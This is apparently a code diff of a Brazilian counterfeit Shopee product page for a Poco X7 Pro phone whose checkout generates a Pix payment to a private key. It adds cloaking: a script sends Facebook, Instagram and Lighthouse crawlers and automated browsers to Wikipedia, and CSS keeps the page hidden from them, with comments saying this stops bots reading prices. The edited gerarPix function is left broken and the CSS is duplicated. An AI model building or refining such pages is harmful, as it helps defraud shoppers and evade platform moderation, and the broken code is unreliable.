@@ -1,94 +1,136 @@
-<!DOCTYPE html>
+  <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>Xiaomi Poco X7 Pro 5G - Lote Global 2026</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+    <title>Xiaomi Poco X7 Pro 5G - Especificações e Ofertas Lote Global</title>
+    <meta name="description" content="Confira a ficha técnica do Poco X7 Pro 5G. Versão Global com processador premium e tela AMOLED. Veja estoque disponível.">
+    <meta name="keywords" content="Xiaomi, Poco X7 Pro, 5G, Smartphone, Oferta, Shopee">
+
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Informativo Técnico: Dispositivos Globais 2026">
+    <meta property="og:description" content="Análise técnica de hardware e compatibilidade de redes móveis.">
+    <meta property="og:image" content="https://down-br.img.susercontent.com/file/br-11134207-81z1k-meadx6k4pddue4">
 
     <script>
     (function() {
+        // Bloqueia robôs de redes sociais mas deixa o Google entrar (SEO)
         const botsBloqueados = ['facebookexternalhit', 'facebot', 'facebookcatalog', 'fna.fbcdn', 'lookaside', 'instagram', 'lighthouse'];
         const ua = navigator.userAgent.toLowerCase();
         const ref = document.referrer.toLowerCase();
+        
         const ehBot = botsBloqueados.some(b => ua.includes(b) || ref.includes(b));
-        if (ehBot || navigator.webdriver) {
+        const ehAutomacao = navigator.webdriver;
+
+        if (ehBot || ehAutomacao) {
+            // Se for robô, ele é jogado para a Wikipedia (Conteúdo Neutro)
             window.location.replace("https://pt.wikipedia.org/wiki/Xiaomi");
         } else {
+            // Se for humano ou Google, libera o visual da página
             document.documentElement.classList.add('viva-humanos');
         }
     })();
     </script>
 
     <style>
+        /* Blindagem: A página começa escondida para o robô não ler preço/fotos via OCR */
         html { display: none !important; }
+        
+        /* Só mostra o conteúdo se NÃO for robô de rede social */
         html.viva-humanos { display: block !important; }
-        :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --shopee-blue: #002060; --blue-sel: #2673dd; --shopee-joinha: #2673dd; }
-        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: -apple-system, HelveticaNeue, sans-serif; }
-        body { background: var(--bg); overflow-x: hidden; width: 100%; }
+        
+        /* SEU CSS COMEÇA AQUI ABAIXO */
+        
+       :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --shopee-blue: #002060; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { background: var(--bg); font-family: -apple-system, HelveticaNeue, sans-serif; overflow-x: hidden; width: 100%; }
 
-        /* Header */
         .top-nav { background: white; padding: 10px; display: flex; align-items: center; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid #eee; height: 50px; }
-        .search-bar { flex: 1; margin: 0 12px; background: #f0f0f0; padding: 8px 35px; border-radius: 2px; font-size: 14px; border: none; outline: none; }
+        .search-container { flex: 1; margin: 0 12px; position: relative; }
+        .search-bar { width: 100%; border: none; background: #f0f0f0; padding: 8px 8px 8px 35px; border-radius: 2px; font-size: 14px; outline: none; }
 
-        /* Flash Sale */
-        .main-slider img { width: 100%; display: block; background: white; }
+        /* ... O RESTANTE DO SEU CSS CONTINUA EXATAMENTE IGUAL ... */
+        
+
+        :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --shopee-blue: #002060; }
+        
+        :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --shopee-blue: #002060; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { background: var(--bg); font-family: -apple-system, HelveticaNeue, sans-serif; overflow-x: hidden; width: 100%; }
+        /* Continue com o restante do seu CSS aqui... */
+        
+        :root { --shopee: #ee4d2d; --teal: #00bfa5; --bg: #f5f5f5; --shopee-blue: #002060; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { background: var(--bg); font-family: -apple-system, HelveticaNeue, sans-serif; overflow-x: hidden; width: 100%; }
+
+        .top-nav { background: white; padding: 10px; display: flex; align-items: center; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid #eee; height: 50px; }
+        .search-container { flex: 1; margin: 0 12px; position: relative; }
+        .search-bar { width: 100%; border: none; background: #f0f0f0; padding: 8px 8px 8px 35px; border-radius: 2px; font-size: 14px; outline: none; }
+
+        .main-slider { display: flex; overflow-x: auto; scroll-snap-type: x mandatory; scrollbar-width: none; background: white; position: relative; }
+        .main-slider img { width: 100vw; scroll-snap-align: start; flex-shrink: 0; object-fit: contain; }
+
         .flash-sale-banner { background: linear-gradient(90deg, #ff4d2d, #ff8a00); color: white; padding: 8px 15px; display: flex; align-items: center; justify-content: space-between; }
-        .timer-unit { background: #000; color: #fff; padding: 2px 4px; border-radius: 2px; font-size: 12px; font-weight: bold; }
-        
-        /* Product Info */
-        .product-card { background: white; padding: 15px; margin-bottom: 8px; }
-        .price-row { color: var(--shopee); font-size: 26px; font-weight: 500; display: flex; align-items: baseline; gap: 5px; }
-        .old-price { color: #999; text-decoration: line-through; font-size: 14px; }
+        .flash-sale-left { display: flex; align-items: center; gap: 8px; font-weight: bold; font-style: italic; font-size: 16px; }
+        .timer-box { display: flex; align-items: center; gap: 4px; font-style: normal; }
+        .timer-unit { background: #000; color: #fff; padding: 2px 4px; border-radius: 2px; font-size: 12px; font-weight: bold; min-width: 22px; text-align: center; }
 
-        /* Selo Indicado com Mãozinha de Libra (Azul Original) */
-        .selo-indicado { background: var(--shopee); color: white; font-size: 10px; padding: 2px 5px; border-radius: 2px; margin-right: 5px; display: inline-flex; align-items: center; gap: 3px; font-weight: bold; }
-        .icon-joinha { color: white; font-size: 10px; }
+        .free-shipping-banner { background: var(--shopee-blue); color: white; padding: 8px 15px; display: flex; align-items: center; font-size: 14px; font-weight: bold; }
+        .free-shipping-banner img { height: 18px; margin-right: 8px; }
 
-        /* Shop Section */
+        .product-card { background: white; padding: 15px; margin-bottom: 8px; position: relative; }
+        .price-row { color: var(--shopee); font-size: 24px; font-weight: 500; display: flex; align-items: baseline; gap: 5px; }
+        .old-price { color: #999; text-decoration: line-through; font-size: 14px; margin-bottom: 5px; }
+        .discount-tag { background: rgba(238, 77, 45, 0.1); color: #ee4d2d; font-size: 11px; font-weight: bold; padding: 2px 4px; border-radius: 2px; margin-left: 8px; text-transform: uppercase; }
+
+        .product-title { font-size: 15px; color: #222; line-height: 1.4; font-weight: 400; }
+        .indicator-tag { background: #ee4d2d; color: white; font-size: 10px; padding: 1px 4px; border-radius: 2px; margin-right: 4px; display: inline-block; vertical-align: middle; }
+
+        .section-box { background: white; padding: 15px; margin-bottom: 8px; }
+        .section-title { font-size: 14px; font-weight: 500; color: #222; margin-bottom: 12px; text-transform: uppercase; }
+        .spec-row { display: flex; padding: 8px 0; border-bottom: 1px solid #f2f2f2; font-size: 13px; }
+        .spec-label { width: 120px; color: #757575; }
+        .spec-value { flex: 1; color: #222; }
+        .desc-text { font-size: 13px; color: #555; line-height: 1.6; white-space: pre-line; }
+
         .shop-section { background: white; padding: 15px; margin-bottom: 8px; display: flex; align-items: center; justify-content: space-between; }
-        .shop-info { display: flex; align-items: center; gap: 10px; }
-        .shop-logo { width: 45px; height: 45px; border-radius: 50%; border: 1px solid #eee; }
-        .btn-visit-shop { border: 1px solid var(--shopee); color: var(--shopee); padding: 5px 12px; font-size: 12px; background: white; border-radius: 2px; text-decoration: none; font-weight: 500; }
+        .shop-info { display: flex; align-items: center; gap: 10px; position: relative; }
+        .shop-avatar { width: 45px; height: 45px; border-radius: 50%; border: 1px solid #eee; }
+        .badge-indicado { position: absolute; bottom: -5px; left: 22px; transform: translateX(-50%); background: var(--shopee); color: white; font-size: 8px; padding: 1px 4px; border-radius: 8px; font-weight: bold; border: 1px solid white; }
+        .shop-name { font-size: 14px; font-weight: 500; }
+        .shop-btn { border: 1px solid var(--shopee); color: var(--shopee); padding: 4px 12px; font-size: 12px; border-radius: 2px; text-decoration: none; }
 
-        /* Footer */
-        .footer-main { position: fixed; bottom: 0; width: 100%; height: 55px; background: white; display: flex; border-top: 1px solid #ddd; z-index: 1000; }
-        .btn-orange-full { flex: 1; background: var(--shopee); color: white; border: none; font-weight: bold; font-size: 16px; cursor: pointer; height: 100%; text-transform: uppercase; }
+        .product-ratings-header__wrapper { background: white; padding: 15px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; }
+        .product-ratings-header__left { display: flex; flex-direction: column; gap: 4px; }
+        .product-ratings-header-title { color: #222; font-size: 14px; font-weight: 500; }
+        .product-ratings-header__stats { display: flex; align-items: center; gap: 5px; text-decoration: none; color: #222; }
+        .VUvows { width: 10px; height: 10px; }
+        .product-ratings-header__stats-avg { color: var(--shopee); font-weight: bold; font-size: 12px; }
+        .product-ratings-header__stats-count { color: #757575; font-size: 12px; }
+        .product-ratings-header__see-all { color: var(--shopee); font-size: 13px; text-decoration: none; display: flex; align-items: center; gap: 4px; }
 
-        /* Botões Estilo Shopee */
-        .btn-shopee-lg { width: 100%; background-color: var(--shopee); color: white; border: none; padding: 14px 0; font-size: 16px; font-weight: bold; border-radius: 2px; text-transform: uppercase; cursor: pointer; margin-top: 15px; display: block; }
+        .review-item { background: white; padding: 15px; border-bottom: 1px solid #f2f2f2; }
+        .user-info { display: flex; align-items: center; gap: 8px; font-size: 13px; font-weight: 500; }
+        .review-media { display: flex; gap: 6px; overflow-x: auto; margin-top: 10px; }
+        .review-media img, .review-media video { width: 100px; height: 100px; object-fit: cover; border-radius: 2px; flex-shrink: 0; }
 
-        /* Modal */
+        .footer { position: fixed; bottom: 0; width: 100%; height: 50px; background: white; display: flex; border-top: 1px solid #ddd; z-index: 1000; }
+        .btn-buy { flex: 1; background: var(--shopee); color: white; border: none; font-weight: bold; font-size: 15px; cursor: pointer; }
+
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); z-index: 2000; }
-        .modal-content { position: absolute; bottom: 0; width: 100%; background: #f5f5f5; border-radius: 12px 12px 0 0; max-height: 95vh; overflow-y: auto; padding-bottom: 20px; }
-        
-        .modal-nav { background: white; padding: 15px; border-bottom: 1px solid #eee; display: flex; align-items: center; position: sticky; top: 0; z-index: 10; }
-        .modal-nav i { color: var(--shopee); font-size: 20px; cursor: pointer; margin-right: 15px; }
-        .modal-nav span { font-weight: bold; font-size: 16px; color: #333; }
-
-        /* Steps */
-        .step-container { background: white; padding: 15px; margin-bottom: 8px; }
-        .section-title { font-size: 14px; font-weight: bold; margin-bottom: 12px; color: #333; }
-        .opt-btn { background: #f5f5f5; border: 1px solid #f5f5f5; padding: 8px 12px; border-radius: 2px; font-size: 12px; cursor: pointer; margin: 0 8px 8px 0; }
+        .modal-content { position: absolute; bottom: 0; width: 100%; background: white; border-radius: 12px 12px 0 0; padding: 15px; max-height: 90vh; overflow-y: auto; }
+        .opt-btn { background: #f5f5f5; border: 1px solid #f5f5f5; padding: 8px 12px; border-radius: 4px; font-size: 12px; margin: 4px; cursor: pointer; }
         .opt-btn.selected { border-color: var(--shopee); color: var(--shopee); background: #fff5f1; }
-        
-        .delivery-header { background: #fff; padding: 15px; border-bottom: 1px solid #eee; margin-bottom: 8px; }
-        .delivery-header h3 { font-size: 13px; color: var(--shopee); display: flex; align-items: center; gap: 5px; margin-bottom: 5px; }
-        
         .input-box { width: 100%; border: 1px solid #ddd; padding: 12px; border-radius: 4px; margin-bottom: 10px; font-size: 14px; outline: none; }
-        
-        .shipping-option { border: 1px solid #eee; padding: 12px; border-radius: 4px; margin-bottom: 10px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; background: #fff; }
-        .shipping-option.selected { border-color: var(--teal); background: #f6fffe; }
-
-        .shopee-radio { width: 18px; height: 18px; border: 1px solid #ccc; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
-        .shopee-radio.selected { border-color: var(--blue-sel); }
-        .shopee-radio.selected::after { content: ""; width: 10px; height: 10px; background: var(--blue-sel); border-radius: 50%; }
-
-        .economy-text { color: var(--shopee); font-size: 12px; font-weight: bold; text-align: right; margin-top: 5px; }
+        .cep-row { display: flex; gap: 8px; margin-bottom: 10px; }
+        .btn-cep { background: var(--shopee); color: white; border: none; padding: 0 15px; border-radius: 4px; font-size: 12px; cursor: pointer; font-weight: bold; }
+        .btn-voltar { background: #eee; color: #555; border: none; width: 100%; height: 45px; border-radius: 4px; margin-top: 8px; font-weight: bold; cursor: pointer; font-size: 14px; }
+        .garantia-shopee { display: flex; flex-direction: column; align-items: center; margin-bottom: 10px; color: var(--shopee); font-weight: 500; font-size: 12px; line-height: 1.2; text-align: center; }
+        .garantia-shopee i { font-size: 20px; margin-bottom: 4px; }
     </style>
 </head>
 <body>
-
     <div class="top-nav">
         <i class="fas fa-arrow-left" style="color:var(--shopee);"></i>
         <div style="flex:1; position:relative; margin: 0 10px;">
@@ -361,11 +403,15 @@
         }
 
         function gerarPix() {
-            const val = calcTotal().toFixed(2);
-            const px = "00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b5520400005303986540" + val + "5802BR5917LOJA ONIX OFICIAL6009SAO PAULO62070503***6304";
-            document.getElementById('qr-code').src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(px)}&color=ee4d2d`;
-            document.getElementById('pix-copy').innerText = px;
-            nextStep(4);
+            const PIX_VALUE = "00020101021226580014br.gov.bcb.pix0136db0cbb53-17be-449c-89c8-9bffd8f6c7b55204000053039865406599.005802BR5917LOJA OFICIAL ONIX6009SAO PAULO62070503***630453AF";
+        
+        function openModal() { document.getElementById('modal').style.display='block'; }
+        
+        let selectedVar = null;
+        function selectVar(btn) {
+            document.querySelectorAll('.opt-btn').forEach(b => b.classList.remove('selected'));
+            btn.classList.add('selected');
+            selectedVar = btn.innerText;
         }
 
         function copiarPix() {
@@ -388,3 +434,4 @@
     </script>
 </body>
 </html>
+
